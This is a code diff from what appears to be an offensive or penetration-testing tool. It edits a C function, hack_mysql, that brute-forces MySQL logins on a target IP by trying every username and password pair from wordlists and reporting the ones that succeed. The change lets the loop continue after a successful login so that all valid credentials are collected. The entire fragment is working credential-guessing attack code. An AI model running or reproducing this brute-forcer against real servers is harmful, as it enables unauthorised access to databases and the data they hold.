@@ -30,26 +30,26 @@ int hack_mysql(in_addr_t ip, int port){
 	while(fscanf(f,"%s", passwords[i])!=EOF) i++;
 	totalComb=totalUsernames*totalPasswords;
 	MYSQL *conn=NULL;
-	conn = mysql_init(NULL);
-	if(conn == NULL){
-		show_error("", errno);
-		return RETURN_ERROR;
-	}
 	for(i=0;i<totalUsernames;i++){
 		for(int j=0;j<totalPasswords;j++,cont++){
 			printf("\rPercentaje completed: %.4lf%% (%s/%s)               ",(double)((cont/totalComb)*100.0),usernames[i], passwords[j]);
 			fflush(stdout);
 			usleep(BRUTE_FORCE_DELAY);
+			if(conn==NULL) conn = mysql_init(NULL);
+			if(conn == NULL){
+				show_error("", errno);
+				return RETURN_ERROR;
+			}
 			if(mysql_real_connect(conn, inet_ntoa(*((struct in_addr*)&dest_ip.s_addr)), usernames[i], passwords[j], "sys", port, NULL, 0) != NULL){
 				show_error("", errno);
 				printf("%s",HRED);
 				printf("\n\nLoging successfull with user: %s, password: %s. Service Vulnerable\n\n",usernames[i], passwords[j]);
 				mysql_close(conn);
-				return RETURN_OK;
+				conn=NULL;
 			}
 		}
 	}
 	mysql_close(conn);
 	printf("%s",DEFAULT);
-	RETURN_OK;
+	return RETURN_OK;
 }
